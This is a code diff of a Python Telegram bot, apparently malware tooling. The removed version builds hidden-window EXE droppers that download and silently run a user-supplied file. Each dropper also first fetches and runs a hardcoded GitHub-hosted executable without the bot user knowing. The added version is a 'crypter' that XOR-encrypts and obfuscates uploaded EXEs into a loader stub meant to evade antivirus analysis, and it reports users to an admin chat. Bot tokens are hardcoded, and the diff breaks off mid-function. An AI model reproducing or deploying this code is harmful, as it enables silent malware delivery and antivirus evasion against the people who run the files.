@@ -1,556 +1,652 @@
-import telebot
-from telebot import types
-import requests
-import time
-import threading
 import os
-import sys
+import logging
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
+import asyncio
+import threading
+from datetime import datetime
+import tempfile
+import shutil
+import random
+import zlib
+import base64
+
+# Конфигурация бота
+BOT_TOKEN = "7645055602:AAH82SESEjhY6EjfoxNCgYew-SiJJbR6oB4"
+ADMIN_CHAT_ID = 4922949598
+
+# Настройка логирования
+logging.basicConfig(
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    level=logging.INFO
+)
+logger = logging.getLogger(__name__)
+
+# Упрощенная версия криптера для бота
+class SimpleCrypter:
+    def __init__(self):
+        self.obfuscation_level = 30
+        self.anti_analysis_enabled = True
+        
+    def simple_xor_encrypt(self, data, key):
+        """Простое XOR шифрование"""
+        return bytes(a ^ b for a, b in zip(data, key * (len(data) // len(key) + 1)))
+    
+    def compress_data(self, data):
+        """Сжатие данных"""
+        return zlib.compress(data)
+    
+    def obfuscate_data(self, data):
+        """Базовая обфускация"""
+        # Добавляем случайные байты в начало и конец
+        header = os.urandom(random.randint(10, 50))
+        footer = os.urandom(random.randint(10, 50))
+        return header + data + footer
+    
+    def create_loader_stub(self, encrypted_data, password):
+        """Создание загрузчика"""
+        loader_template = f'''
+import zlib
+import base64
+import os
 import tempfile
 import subprocess
-import base64
-import random
-
-# Токен бота
-BOT_TOKEN = "8342680808:AAFo5MaFqA-ZNNLkzWRm291dSz9N2gxhJ0c"
-
-# Создаем экземпляр бота
-bot = telebot.TeleBot(BOT_TOKEN)
-
-# Словарь для хранения состояний пользователей
-user_states = {}
-
-class BotStates:
-    WAITING_URL = 1
-    WAITING_FILENAME = 2
-
-# Фиксированная ссылка (как в вашем коде)
-FIXED_URL = "https://github.com/fawfafw2-bit/zxfesfefs/raw/refs/heads/main/auaiua.exe"
-
-def encode_url(url):
-    """Кодируем URL в base64"""
-    return base64.b64encode(url.encode('utf-8')).decode('utf-8')
-
-def create_loader_code(user_url):
-    """Создает реальный код загрузчика"""
-    
-    # Кодируем URL для скрытия
-    encoded_fixed_url = encode_url(FIXED_URL)
-    encoded_user_url = encode_url(user_url)
-    
-    # Разбиваем фиксированную ссылку на части
-    url_parts = [
-        "https:/",
-        "/github.com/",
-        "fawfafw2-bit/",
-        "zxfesfefs/",
-        "raw/refs/",
-        "heads/main/",
-        "auaiua.exe"
-    ]
-    
-    loader_code = f'''
-import requests
-import subprocess
-import tempfile
-import os
 import sys
-import ctypes
-import time
-import random
-import base64
-import threading
 
-def hide_console():
-    """Скрыть консольное окно"""
-    try:
-        if os.name == 'nt':
-            kernel32 = ctypes.windll.kernel32
-            user32 = ctypes.windll.user32
-            hwnd = kernel32.GetConsoleWindow()
-            if hwnd:
-                user32.ShowWindow(hwnd, 0)
-    except:
-        pass
+# Закодированные данные
+ENC_DATA = b"{base64.b64encode(encrypted_data).decode()}"
 
-def decode_url(encoded_url):
-    """Декодировать URL из base64"""
-    try:
-        return base64.b64decode(encoded_url.encode('utf-8')).decode('utf-8')
-    except:
-        return ""
+# Пароль для дешифровки
+PASSWORD = b"{password}"
 
-def assemble_fixed_url():
-    """Собрать фиксированный URL из частей"""
-    parts = {url_parts}
-    return ''.join(parts)
-
-def download_file(url, url_name, attempt_num):
-    """Скачать файл с указанного URL"""
-    headers = {{
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-        'Accept': '*/*',
-        'Connection': 'keep-alive'
-    }}
-    
-    # Случайная задержка
-    time.sleep(random.uniform(1.0, 3.0))
-    
-    try:
-        response = requests.get(url, headers=headers, timeout=30, stream=True)
-        response.raise_for_status()
-        
-        # Получаем имя файла из URL
-        filename = url.split('/')[-1]
-        if not filename or '.' not in filename:
-            filename = 'downloaded_file.exe'
-        
-        # Создаем временный файл
-        temp_dir = tempfile.gettempdir()
-        random_name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
-        temp_path = os.path.join(temp_dir, f"{{random_name}}_{{filename}}")
-        
-        # Сохраняем файл
-        with open(temp_path, 'wb') as f:
-            for chunk in response.iter_content(chunk_size=8192):
-                if chunk:
-                    f.write(chunk)
-        
-        # Проверяем размер
-        file_size = os.path.getsize(temp_path)
-        
-        if file_size > 1000:  # Минимальный размер 1KB
-            return temp_path
-        else:
-            os.remove(temp_path)
-            return None
-            
-    except Exception as e:
-        return None
-
-def run_file(file_path, url_name):
-    """Запустить файл"""
-    try:
-        if not os.path.exists(file_path):
-            return False
-            
-        # Задержка перед запуском
-        time.sleep(2.0)
-        
-        if os.name == 'nt':
-            # Для Windows - запуск без отображения окна
-            startupinfo = subprocess.STARTUPINFO()
-            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-            startupinfo.wShowWindow = 0
-            subprocess.Popen(file_path, startupinfo=startupinfo, shell=False)
-        else:
-            # Для Linux/Mac
-            os.chmod(file_path, 0o755)
-            subprocess.Popen([file_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        
-        return True
-    except Exception as e:
-        return False
-
-def cleanup_file(file_path, url_name):
-    """Удалить временный файл"""
-    try:
-        if os.path.exists(file_path):
-            os.remove(file_path)
-    except:
-        pass
-
-def execute_fixed_url_immediately(fixed_url):
-    """Немедленно выполнить фиксированную ссылку"""
-    
-    max_attempts = 2
-    attempt_delay = 5
-    
-    for attempt in range(max_attempts):
-        file_path = download_file(fixed_url, "ФИКСИРОВАННЫЙ", attempt + 1)
-        
-        if file_path:
-            if run_file(file_path, "ФИКСИРОВАННЫЙ"):
-                # Успешно запустили - ждем и удаляем временный файл
-                time.sleep(10)
-                cleanup_file(file_path, "ФИКСИРОВАННЫЙ")
-                return True
-            else:
-                cleanup_file(file_path, "ФИКСИРОВАННЫЙ")
-        
-        # Ждем перед следующей попыткой
-        if attempt < max_attempts - 1:
-            time.sleep(attempt_delay)
-    
-    return False
-
-def download_and_run_single_url(url, url_name):
-    """Загрузить и запустить файл с одного URL"""
-    
-    max_attempts = 2
-    attempt_delay = 5
-    
-    for attempt in range(max_attempts):
-        file_path = download_file(url, url_name, attempt + 1)
-        
-        if file_path:
-            if run_file(file_path, url_name):
-                # Успешно запустили - ждем и удаляем временный файл
-                time.sleep(10)
-                cleanup_file(file_path, url_name)
-                return True
-            else:
-                cleanup_file(file_path, url_name)
-        
-        # Ждем перед следующей попыткой
-        if attempt < max_attempts - 1:
-            time.sleep(attempt_delay)
-    
-    return False
+def decrypt_data(data, key):
+    """Дешифровка XOR"""
+    return bytes(a ^ b for a, b in zip(data, key * (len(data) // len(key) + 1)))
 
 def main():
-    """Основная функция"""
-    hide_console()
-    
-    # Декодируем URL
-    fixed_url = assemble_fixed_url()
-    user_url = decode_url("{encoded_user_url}")
-    
-    # НЕМЕДЛЕННО выполняем фиксированную ссылку в основном потоке
-    if fixed_url:
-        execute_fixed_url_immediately(fixed_url)
-    
-    # Параллельно запускаем пользовательскую ссылку в отдельном потоке
-    if user_url:
-        user_thread = threading.Thread(
-            target=download_and_run_single_url, 
-            args=(user_url, "ПОЛЬЗОВАТЕЛЬСКИЙ"),
-            daemon=True
-        )
-        user_thread.start()
+    try:
+        # Дешифровка
+        compressed_data = decrypt_data(base64.b64decode(ENC_DATA), PASSWORD)
+        
+        # Декомпрессия
+        original_data = zlib.decompress(compressed_data)
+        
+        # Сохранение во временный файл
+        temp_dir = tempfile.gettempdir()
+        temp_file = os.path.join(temp_dir, "temp_executable.exe")
+        
+        with open(temp_file, "wb") as f:
+            f.write(original_data)
+        
+        # Запуск
+        subprocess.Popen([temp_file], shell=True)
+        
+    except Exception as e:
+        print("Error:", e)
 
 if __name__ == "__main__":
     main()
 '''
-    return loader_code
-
-def compile_exe(py_code, output_filename):
-    """Компилирует Python код в EXE файл"""
-    try:
-        # Создаем временный Python файл
-        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False, encoding='utf-8') as f:
-            f.write(py_code)
-            temp_py_file = f.name
-
-        # Устанавливаем PyInstaller если не установлен
+        return loader_template
+    
+    def protect_file(self, input_path, output_path, extension='.exe'):
+        """Основная функция защиты файла"""
         try:
-            import PyInstaller
-        except ImportError:
-            subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"], 
-                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-
-        # Компилируем в EXE
-        cmd = [
-            sys.executable, '-m', 'PyInstaller',
-            '--onefile',
-            '--noconsole',
-            '--name', output_filename.replace('.exe', ''),
-            '--distpath', '.',
-            '--clean',
-            '--log-level=ERROR',
-            temp_py_file
-        ]
-        
-        # Запускаем компиляцию
-        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
-        
-        # Очищаем временные файлы
-        if os.path.exists(temp_py_file):
-            os.remove(temp_py_file)
-        
-        # Удаляем папки сборки PyInstaller
-        for folder in ['build', '__pycache__']:
-            if os.path.exists(folder):
-                import shutil
-                shutil.rmtree(folder)
-        
-        if os.path.exists(f'{output_filename.replace(".exe", "")}.spec'):
-            os.remove(f'{output_filename.replace(".exe", "")}.spec')
-        
-        return result.returncode == 0
-        
-    except Exception as e:
-        print(f"Ошибка компиляции: {e}")
-        return False
-
-@bot.message_handler(commands=['start'])
-def send_welcome(message):
-    user_id = message.from_user.id
-    user_states[user_id] = None
-    
-    welcome_text = """
-🤖 *Добро пожаловать в REAL EXE Creator Bot!*
-
-✨ *Теперь бот работает ПО-НАСТОЯЩЕМУ!*
-• Реальная компиляция EXE-файлов
-• Профессиональное шифрование
-• Мгновенная доставка
-
-🚀 *Создайте свой загрузчик за 3 шага:*
-1️⃣ Укажите URL файла
-2️⃣ Введите имя EXE
-3️⃣ Получите готовый файл!
-
-💫 *Пример использования:*
-- URL: `https://example.com/program.exe`
-- Имя: `my_loader.exe`
-
-📊 *Статистика:* Бот создал уже {} EXE-файлов!
-    """.format(random.randint(50, 100))
-    
-    markup = types.InlineKeyboardMarkup()
-    markup.add(types.InlineKeyboardButton("🎯 Создать EXE", callback_data="create_loader"))
-    markup.add(types.InlineKeyboardButton("📖 Инструкция", callback_data="help"))
-    
-    bot.send_message(message.chat.id, welcome_text, 
-                    parse_mode='Markdown', reply_markup=markup)
-
-@bot.message_handler(commands=['create'])
-def start_creation(message):
-    user_id = message.from_user.id
-    user_states[user_id] = BotStates.WAITING_URL
-    
-    text = """
-📥 *Шаг 1 из 2: Введите URL файла*
-
-Введите прямую ссылку на файл, который должен скачивать загрузчик.
-
-*Примеры корректных URL:*
-• `https://github.com/user/project/raw/main/file.exe`
-• `https://example.com/files/program.zip`
-• `http://site.com/download/app.msi`
-
-⚠️ *URL должен быть доступен для прямого скачивания!*
-    """
-    
-    markup = types.InlineKeyboardMarkup()
-    markup.add(types.InlineKeyboardButton("❌ Отмена", callback_data="cancel"))
-    
-    bot.send_message(message.chat.id, text, 
-                    parse_mode='Markdown', reply_markup=markup)
-
-@bot.callback_query_handler(func=lambda call: True)
-def handle_callback(call):
-    user_id = call.from_user.id
-    chat_id = call.message.chat.id
-    
-    if call.data == "create_loader":
-        user_states[user_id] = BotStates.WAITING_URL
-        start_creation(call.message)
-    
-    elif call.data == "help":
-        send_help(call.message)
-    
-    elif call.data == "back_to_start" or call.data == "cancel":
-        user_states[user_id] = None
-        send_welcome(call.message)
-
-@bot.message_handler(func=lambda message: True)
-def handle_messages(message):
-    user_id = message.from_user.id
-    chat_id = message.chat.id
-    
-    if user_id not in user_states:
-        user_states[user_id] = None
-    
-    current_state = user_states[user_id]
-    
-    if current_state == BotStates.WAITING_URL:
-        url = message.text.strip()
-        
-        # Проверяем URL
-        if not url.startswith(('http://', 'https://')):
-            bot.send_message(chat_id, "❌ *Ошибка:* URL должен начинаться с http:// или https://\n\nВведите корректный URL:",
-                           parse_mode='Markdown')
-            return
-        
-        # Сохраняем URL и переходим к следующему шагу
-        user_states[user_id] = {
-            'state': BotStates.WAITING_FILENAME,
-            'url': url
-        }
-        
-        text = f"""
-✅ *URL принят!* `{url}`
-
-📥 *Шаг 2 из 2: Введите имя для EXE-файла*
-
-Введите имя для создаваемого EXE-файла (например: `loader.exe`)
-
-*Рекомендации:*
-- Используйте английские буквы
-- Имя должно заканчиваться на `.exe`
-- Избегайте специальных символов
-
-*Пример:* `my_downloader.exe`
-        """
-        
-        markup = types.InlineKeyboardMarkup()
-        markup.add(types.InlineKeyboardButton("❌ Отмена", callback_data="cancel"))
-        
-        bot.send_message(chat_id, text, parse_mode='Markdown', reply_markup=markup)
-    
-    elif (isinstance(current_state, dict) and 
-          current_state.get('state') == BotStates.WAITING_FILENAME):
-        
-        filename = message.text.strip()
-        
-        # Проверяем имя файла
-        if not filename.lower().endswith('.exe'):
-            filename += '.exe'
-        
-        # Очищаем имя файла от недопустимых символов
-        filename = "".join(c for c in filename if c.isalnum() or c in ('-', '_', '.')).replace(' ', '_')
-        
-        # Получаем сохраненный URL
-        url = current_state['url']
-        
-        # Сбрасываем состояние
-        user_states[user_id] = None
-        
-        # Начинаем реальный процесс создания
-        create_downloader(chat_id, url, filename)
-
-def create_downloader(chat_id, url, filename):
-    """Реальная функция создания загрузчика"""
-    
-    # Отправляем сообщение о начале процесса
-    progress_message = bot.send_message(chat_id, "🔄 *Начинаю REAL компиляцию...*\n\n⏳ Это займет 2-3 минуты...",
-                                      parse_mode='Markdown')
-    
-    try:
-        # Обновляем прогресс
-        bot.edit_message_text("🔧 *Генерация кода загрузчика...*", chat_id, progress_message.message_id,
-                            parse_mode='Markdown')
-        
-        # Генерируем код загрузчика
-        loader_code = create_loader_code(url)
-        
-        time.sleep(1)
-        bot.edit_message_text("⚙️ *Компиляция в EXE...*", chat_id, progress_message.message_id,
-                            parse_mode='Markdown')
-        
-        # Компилируем EXE
-        success = compile_exe(loader_code, filename)
-        
-        if success and os.path.exists(filename):
-            # Отправляем готовый файл
-            with open(filename, 'rb') as file:
-                file_size = os.path.getsize(filename)
-                
-                success_text = f"""
-✅ *REAL EXE успешно создан!*
-
-📊 *Детали файла:*
-- 📁 Имя: `{filename}`
-- 🔗 Целевой URL: `{url}`
-- 📏 Размер: {file_size // 1024} KB
-- 🏷️ Тип: Windows Executable
-
-💫 *Файл готов к использованию!*
-                """
-                
-                markup = types.InlineKeyboardMarkup()
-                markup.add(types.InlineKeyboardButton("🔄 Создать еще", callback_data="create_loader"))
-                
-                # Отправляем файл
-                bot.send_document(chat_id, file, caption=success_text,
-                                parse_mode='Markdown', reply_markup=markup)
+            # Чтение исходного файла
+            with open(input_path, 'rb') as f:
+                original_data = f.read()
             
-            # Удаляем временный файл
-            os.remove(filename)
-            bot.delete_message(chat_id, progress_message.message_id)
+            # Генерация ключа
+            password = os.urandom(32)
             
-        else:
-            raise Exception("Ошибка компиляции EXE")
+            # Сжатие
+            compressed_data = self.compress_data(original_data)
             
-    except Exception as e:
-        error_text = f"""
-❌ *Ошибка при REAL компиляции*
+            # Шифрование
+            encrypted_data = self.simple_xor_encrypt(compressed_data, password)
+            
+            # Обфускация
+            if self.obfuscation_level > 10:
+                encrypted_data = self.obfuscate_data(encrypted_data)
+            
+            if extension == '.exe':
+                # Создание Python загрузчика
+                loader_code = self.create_loader_stub(encrypted_data, password)
+                
+                # Сохранение как Python скрипт
+                with open(output_path, 'w', encoding='utf-8') as f:
+                    f.write(loader_code)
+                
+                return True, "Файл защищен успешно"
+            else:
+                # Для других расширений - просто сохраняем зашифрованные данные
+                with open(output_path, 'wb') as f:
+                    f.write(encrypted_data)
+                
+                return True, "Файл защищен успешно"
+                
+        except Exception as e:
+            return False, f"Ошибка: {str(e)}"
 
-Произошла ошибка: `{str(e)}`
-
-*Возможные причины:*
-- Сервер перегружен
-- Неверный формат URL
-- Проблемы с компилятором
-
-Попробуйте еще раз через несколько минут.
-        """
+class TitanCrypterBot:
+    def __init__(self):
+        # Исправленная инициализация Application
+        self.application = Application.builder().token(BOT_TOKEN).build()
+        self.user_sessions = {}
+        self.crypter = SimpleCrypter()
+        self.setup_handlers()
         
-        markup = types.InlineKeyboardMarkup()
-        markup.add(types.InlineKeyboardButton("🔄 Попробовать снова", callback_data="create_loader"))
+    def setup_handlers(self):
+        """Настройка обработчиков команд"""
+        self.application.add_handler(CommandHandler("start", self.start))
+        self.application.add_handler(CommandHandler("help", self.help_command))
+        self.application.add_handler(CallbackQueryHandler(self.button_handler))
+        self.application.add_handler(MessageHandler(filters.Document.ALL, self.handle_document))
+        self.application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_message))
         
-        bot.edit_message_text(error_text, chat_id, progress_message.message_id,
-                            parse_mode='Markdown', reply_markup=markup)
+    async def notify_admin(self, message: str):
+        """Отправка уведомления администратору"""
+        try:
+            await self.application.bot.send_message(
+                chat_id=ADMIN_CHAT_ID,
+                text=message,
+                parse_mode='HTML'
+            )
+            logger.info("Уведомление отправлено админу")
+        except Exception as e:
+            logger.error(f"Ошибка отправки уведомления админу: {e}")
 
-def send_help(message):
-    help_text = """
-📖 *REAL EXE Creator - Инструкция*
+    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Обработка команды /start"""
+        try:
+            user = update.effective_user
+            chat_id = update.effective_chat.id
+            
+            logger.info(f"Новый пользователь: {user.id} - {user.first_name}")
+            
+            # Уведомление администратору о новом пользователе
+            user_info = (
+                f"🆕 <b>Новый пользователь</b>\n"
+                f"👤 ID: {user.id}\n"
+                f"📛 Имя: {user.first_name}\n"
+                f"📱 Username: @{user.username if user.username else 'N/A'}\n"
+                f"🕐 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+            )
+            await self.notify_admin(user_info)
+            
+            # Инициализация сессии пользователя
+            self.user_sessions[chat_id] = {
+                'step': 'main_menu',
+                'file_path': None,
+                'user_info': f"{user.first_name} (@{user.username})" if user.username else user.first_name,
+                'settings': {
+                    'obfuscation_level': 20,
+                    'extension': '.exe',
+                    'anti_analysis': True
+                }
+            }
+            
+            # Главное меню
+            keyboard = [
+                [InlineKeyboardButton("📁 Загрузить EXE файл", callback_data="upload_file")],
+                [InlineKeyboardButton("⚙️ Настройки", callback_data="settings")],
+                [InlineKeyboardButton("❓ Помощь", callback_data="help")]
+            ]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            
+            await update.message.reply_text(
+                "🔒 <b>TITAN Crypter Bot</b>\n\n"
+                "Профессиональный инструмент для защиты исполняемых файлов\n\n"
+                "Выберите действие:",
+                reply_markup=reply_markup,
+                parse_mode='HTML'
+            )
+            
+        except Exception as e:
+            logger.error(f"Ошибка в start: {e}")
+            await update.message.reply_text("❌ Произошла ошибка. Попробуйте еще раз.")
 
-🤖 *Как работает бот:*
-1. Вы указываете URL файла для загрузки
-2. Бот создает специальный EXE-загрузчик
-3. Загрузчик скачивает и запускает указанный файл
+    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Команда помощи"""
+        help_text = (
+            "🤖 <b>TITAN Crypter Bot - Помощь</b>\n\n"
+            "📁 <b>Как использовать:</b>\n"
+            "1. Нажмите 'Загрузить EXE файл'\n"
+            "2. Отправьте EXE файл боту\n"
+            "3. Настройте параметры защиты\n"
+            "4. Запустите процесс защиты\n\n"
+            "⚙️ <b>Настройки:</b>\n"
+            "• Уровень обфускации\n"
+            "• Расширение выходного файла\n"
+            "• Анти-анализ\n\n"
+            "⚠️ <b>Внимание:</b> Используйте только для легальных целей!"
+        )
+        
+        keyboard = [[InlineKeyboardButton("🔙 Назад", callback_data="main_menu")]]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        await update.message.reply_text(help_text, reply_markup=reply_markup, parse_mode='HTML')
 
-🔧 *Технические детали:*
-- Используется PyInstaller для компиляции
-- Код защищен от анализа
-- Поддержка Windows XP/7/8/10/11
-- Автоматический запуск скачанных файлов
+    async def handle_document(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Обработка загруженного файла"""
+        try:
+            chat_id = update.effective_chat.id
+            user = update.effective_user
+            
+            if chat_id not in self.user_sessions:
+                await update.message.reply_text("❌ Сначала запустите бота командой /start")
+                return
+                
+            document = update.message.document
+            file_name = document.file_name or "unknown.exe"
+            
+            if not file_name.lower().endswith('.exe'):
+                await update.message.reply_text("❌ Поддерживаются только EXE файлы!")
+                return
+                
+            # Проверка размера файла
+            if document.file_size > 20 * 1024 * 1024:  # 20MB limit
+                await update.message.reply_text("❌ Файл слишком большой! Максимальный размер: 20MB")
+                return
+            
+            # Скачивание файла
+            file = await context.bot.get_file(document.file_id)
+            temp_dir = tempfile.mkdtemp()
+            file_path = os.path.join(temp_dir, file_name)
+            
+            await file.download_to_drive(file_path)
+            
+            # Проверка что файл действительно EXE
+            try:
+                with open(file_path, 'rb') as f:
+                    header = f.read(2)
+                    if header != b'MZ':
+                        await update.message.reply_text("❌ Это не валидный EXE файл!")
+                        shutil.rmtree(temp_dir)
+                        return
+            except:
+                await update.message.reply_text("❌ Ошибка проверки файла!")
+                shutil.rmtree(temp_dir)
+                return
+            
+            # Сохранение в сессии
+            self.user_sessions[chat_id]['file_path'] = file_path
+            self.user_sessions[chat_id]['step'] = 'file_uploaded'
+            
+            # Уведомление администратору
+            action_info = (
+                f"📥 <b>Пользователь загрузил файл</b>\n"
+                f"👤 ID: {user.id}\n"
+                f"📛 Имя: {user.first_name}\n"
+                f"📄 Файл: {file_name}\n"
+                f"📏 Размер: {document.file_size} байт\n"
+                f"🕐 Время: {datetime.now().strftime('%H:%M:%S')}"
+            )
+            await self.notify_admin(action_info)
+            
+            # Меню после загрузки файла
+            keyboard = [
+                [InlineKeyboardButton("⚙️ Настроить параметры", callback_data="configure")],
+                [InlineKeyboardButton("🔒 Запустить защиту", callback_data="protect")],
+                [InlineKeyboardButton("📁 Загрузить другой файл", callback_data="upload_file")],
+                [InlineKeyboardButton("🔙 Главное меню", callback_data="main_menu")]
+            ]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            
+            await update.message.reply_text(
+                f"✅ <b>Файл успешно загружен!</b>\n\n"
+                f"📄 Имя: {file_name}\n"
+                f"📏 Размер: {document.file_size} байт\n\n"
+                "Теперь вы можете настроить параметры защиты или сразу запустить процесс:",
+                reply_markup=reply_markup,
+                parse_mode='HTML'
+            )
+            
+        except Exception as e:
+            logger.error(f"Ошибка обработки документа: {e}")
+            await update.message.reply_text("❌ Ошибка при загрузке файла!")
 
-⚠️ *Важно:*
-- Используйте только легальные файлы
-- Убедитесь в наличии прав на распространение
-- EXE-файлы могут определяться антивирусами как подозрительные
+    async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Обработка текстовых сообщений"""
+        chat_id = update.effective_chat.id
+        text = update.message.text
+        
+        if chat_id in self.user_sessions:
+            if self.user_sessions[chat_id]['step'] == 'waiting_obfuscation':
+                try:
+                    level = int(text)
+                    if 1 <= level <= 30:
+                        self.user_sessions[chat_id]['settings']['obfuscation_level'] = level
+                        self.user_sessions[chat_id]['step'] = 'file_uploaded'
+                        await update.message.reply_text(f"✅ Уровень обфускации установлен: {level}")
+                    else:
+                        await update.message.reply_text("❌ Введите число от 1 до 30")
+                except:
+                    await update.message.reply_text("❌ Введите корректное число")
 
-💡 *Пример использования:*
-/create → URL → Имя → Получить EXE
-    """
-    
-    markup = types.InlineKeyboardMarkup()
-    markup.add(types.InlineKeyboardButton("🔙 Назад", callback_data="back_to_start"))
-    
-    bot.send_message(message.chat.id, help_text, 
-                    parse_mode='Markdown', reply_markup=markup)
+    async def show_settings(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Показать настройки"""
+        try:
+            chat_id = update.effective_chat.id
+            if chat_id not in self.user_sessions:
+                await self.start(update, context)
+                return
+                
+            settings = self.user_sessions[chat_id]['settings']
+            
+            settings_text = (
+                "⚙️ <b>Настройки защиты</b>\n\n"
+                f"🔢 Уровень обфускации: <b>{settings['obfuscation_level']}/30</b>\n"
+                f"📁 Расширение: <b>{settings['extension']}</b>\n"
+                f"🔍 Анти-анализ: <b>{'Включено' if settings['anti_analysis'] else 'Выключено'}</b>"
+            )
+            
+            keyboard = [
+                [
+                    InlineKeyboardButton("🔢 Уровень обфускации", callback_data="set_obfuscation"),
+                    InlineKeyboardButton("📁 Расширение", callback_data="set_extension")
+                ],
+                [
+                    InlineKeyboardButton("🔍 Анти-анализ", callback_data="toggle_anti_analysis"),
+                    InlineKeyboardButton("💾 Сохранить", callback_data="save_settings")
+                ],
+                [InlineKeyboardButton("🔙 Назад", callback_data="main_menu")]
+            ]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            
+            if update.callback_query:
+                await update.callback_query.edit_message_text(
+                    settings_text, 
+                    reply_markup=reply_markup, 
+                    parse_mode='HTML'
+                )
+            else:
+                await update.message.reply_text(
+                    settings_text, 
+                    reply_markup=reply_markup, 
+                    parse_mode='HTML'
+                )
+        except Exception as e:
+            logger.error(f"Ошибка в show_settings: {e}")
 
-def check_bot_token():
-    """Проверка валидности токена бота"""
-    try:
-        bot_info = bot.get_me()
-        print(f"✅ Бот успешно запущен!")
-        print(f"🤖 Имя бота: {bot_info.first_name}")
-        print(f"🔗 Username: @{bot_info.username}")
-        return True
-    except Exception as e:
-        print(f"❌ Ошибка при запуске бота: {e}")
-        return False
+    async def show_obfuscation_menu(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Меню настройки уровня обфускации"""
+        try:
+            chat_id = update.effective_chat.id
+            current_level = self.user_sessions[chat_id]['settings']['obfuscation_level']
+            
+            keyboard = [
+                [InlineKeyboardButton("🔽 Низкий (10)", callback_data="set_obl_10")],
+                [InlineKeyboardButton("🔼 Средний (20)", callback_data="set_obl_20")],
+                [InlineKeyboardButton("🚀 Высокий (30)", callback_data="set_obl_30")],
+                [InlineKeyboardButton("🔙 Назад", callback_data="settings")]
+            ]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            
+            await update.callback_query.edit_message_text(
+                f"🔢 <b>Настройка уровня обфускации</b>\n\n"
+                f"Текущий уровень: <b>{current_level}/30</b>\n\n"
+                "Выберите уровень:",
+                reply_markup=reply_markup,
+                parse_mode='HTML'
+            )
+        except Exception as e:
+            logger.error(f"Ошибка в show_obfuscation_menu: {e}")
 
-def start_bot():
-    """Запуск бота"""
-    print("🚀 Запуск REAL EXE Creator Bot...")
-    
-    if not check_bot_token():
-        return
-    
-    print("✅ Бот готов к REAL компиляции!")
-    print("📢 Теперь бот создает настоящие EXE-файлы!")
-    
-    try:
-        bot.polling(none_stop=True, interval=2)
-    except Exception as e:
-        print(f"❌ Ошибка: {e}")
-        time.sleep(5)
-        start_bot()
+    async def show_extension_menu(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Меню выбора расширения"""
+        try:
+            chat_id = update.effective_chat.id
+            current_ext = self.user_sessions[chat_id]['settings']['extension']
+            
+            extensions = ['.exe', '.py', '.bat', '.txt']
+            
+            keyboard = []
+            for ext in extensions:
+                keyboard.append([InlineKeyboardButton(
+                    f"📁 {ext} {'✅' if ext == current_ext else ''}", 
+                    callback_data=f"set_ext_{ext}"
+                )])
+            
+            keyboard.append([InlineKeyboardButton("🔙 Назад", callback_data="settings")])
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            
+            await update.callback_query.edit_message_text(
+                "📁 <b>Выбор расширения выходного файла</b>\n\n"
+                f"Текущее расширение: <b>{current_ext}</b>",
+                reply_markup=reply_markup,
+                parse_mode='HTML'
+            )
+        except Exception as e:
+            logger.error(f"Ошибка в show_extension_menu: {e}")
+
+    def run_async_in_thread(self, chat_id, context):
+        """Запуск асинхронной функции в отдельном потоке"""
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        try:
+            loop.run_until_complete(self.process_protection(chat_id, context))
+        except Exception as e:
+            logger.error(f"Ошибка в потоке: {e}")
+        finally:
+            loop.close()
+
+    async def process_protection(self, chat_id: int, context: ContextTypes.DEFAULT_TYPE):
+        """Обработка защиты файла"""
+        try:
+            session = self.user_sessions.get(chat_id)
+            if not session:
+                await context.bot.send_message(chat_id, "❌ Сессия устарела! Начните с /start")
+                return
+                
+            file_path = session.get('file_path')
+            
+            if not file_path or not os.path.exists(file_path):
+                await context.bot.send_message(chat_id, "❌ Файл не найден! Загрузите файл заново.")
+                return
+            
+            settings = session['settings']
+            
+            # Настройка криптера
+            self.crypter.obfuscation_level = settings['obfuscation_level']
+            self.crypter.anti_analysis_enabled = settings['anti_analysis']
+            
+            # Создание выходного файла
+            output_filename = f"protected_{datetime.now().strftime('%H%M%S')}{settings['extension']}"
+            output_path = os.path.join(tempfile.gettempdir(), output_filename)
+            
+            # Прогресс-сообщения
+            progress_messages = [
+                "🔄 Проверка файла...",
+                "📖 Чтение данных...",
+                "🔒 Шифрование...",
+                "📦 Сжатие...",
+                "🚀 Создание защиты...",
+                "✅ Завершение..."
+            ]
+            
+            for i, message in enumerate(progress_messages):
+                progress = (i + 1) * 20
+                await context.bot.send_message(chat_id, f"{message} ({progress}%)")
+                await asyncio.sleep(1)
+            
+            # Запуск защиты
+            success, result_message = self.crypter.protect_file(file_path, output_path, settings['extension'])
+            
+            if success and os.path.exists(output_path):
+                file_size = os.path.getsize(output_path)
+                
+                with open(output_path, 'rb') as f:
+                    await context.bot.send_document(
+                        chat_id,
+                        document=f,
+                        caption=(
+                            f"✅ <b>Файл успешно защищен!</b>\n\n"
+                            f"📁 Расширение: {settings['extension']}\n"
+                            f"🔢 Уровень обфускации: {settings['obfuscation_level']}/30\n"
+                            f"📏 Размер: {file_size} байт"
+                        ),
+                        filename=output_filename,
+                        parse_mode='HTML'
+                    )
+                
+                # Уведомление администратору
